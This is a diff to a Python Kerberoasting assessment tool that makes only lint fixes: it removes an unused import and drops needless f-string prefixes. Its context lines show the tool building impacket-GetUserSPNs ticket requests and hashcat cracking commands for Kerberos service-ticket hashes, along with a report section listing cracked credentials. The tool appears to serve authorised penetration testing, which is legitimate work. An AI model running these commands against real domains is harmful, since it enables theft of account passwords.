@@ -18,7 +18,6 @@ Requirements:
 """
 
 import argparse
-import json
 import sys
 from datetime import datetime
 from pathlib import Path
@@ -124,7 +123,7 @@ def request_tgs_tickets(domain: str, dc_ip: str, username: str, password: str, t
         import impacket.krb5.asn1
 
         console.print("[yellow][*] Requesting TGS tickets via Impacket...[/yellow]")
-        console.print(f"[yellow][*] Use impacket-GetUserSPNs for production usage:[/yellow]")
+        console.print("[yellow][*] Use impacket-GetUserSPNs for production usage:[/yellow]")
         console.print(f"[cyan]impacket-GetUserSPNs {domain}/{username}:'{password}' -dc-ip {dc_ip} -request -outputfile kerberoast.txt[/cyan]")
 
         return f"impacket-GetUserSPNs {domain}/{username}:'{password}' -dc-ip {dc_ip} -request -outputfile kerberoast.txt"
@@ -134,7 +133,7 @@ def request_tgs_tickets(domain: str, dc_ip: str, username: str, password: str, t
 
         commands = []
         # Generate Impacket command
-        commands.append(f"# Impacket GetUserSPNs (Linux)")
+        commands.append("# Impacket GetUserSPNs (Linux)")
         commands.append(f"impacket-GetUserSPNs {domain}/{username}:'{password}' -dc-ip {dc_ip} -request -outputfile kerberoast.txt")
         commands.append("")
 
@@ -156,22 +155,22 @@ def request_tgs_tickets(domain: str, dc_ip: str, username: str, password: str, t
 def generate_hashcat_commands(hash_file: str) -> list[str]:
     """Generate hashcat commands for cracking Kerberoast hashes."""
     commands = [
-        f"# RC4 (etype 23) - Most common",
+        "# RC4 (etype 23) - Most common",
         f"hashcat -m 13100 {hash_file} /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
         "",
-        f"# AES-128 (etype 17)",
+        "# AES-128 (etype 17)",
         f"hashcat -m 19700 {hash_file} /usr/share/wordlists/rockyou.txt",
         "",
-        f"# AES-256 (etype 18)",
+        "# AES-256 (etype 18)",
         f"hashcat -m 19800 {hash_file} /usr/share/wordlists/rockyou.txt",
         "",
-        f"# Mask attack for common patterns (Season+Year+Special)",
+        "# Mask attack for common patterns (Season+Year+Special)",
         f"hashcat -m 13100 {hash_file} -a 3 '?u?l?l?l?l?l?d?d?d?d?s'",
         "",
-        f"# Combined wordlist + rules",
+        "# Combined wordlist + rules",
         f"hashcat -m 13100 {hash_file} wordlist.txt -r /usr/share/hashcat/rules/d3ad0ne.rule",
         "",
-        f"# Show cracked passwords",
+        "# Show cracked passwords",
         f"hashcat -m 13100 {hash_file} --show",
     ]
     return commands
@@ -254,7 +253,7 @@ Kerberoasting assessment identified **{len(accounts)}** domain accounts with Ser
 """
 
     if cracked:
-        report += f"""
+        report += """
 ## 4. Cracked Credentials
 
 | Account | Password Strength | Admin | Impact |
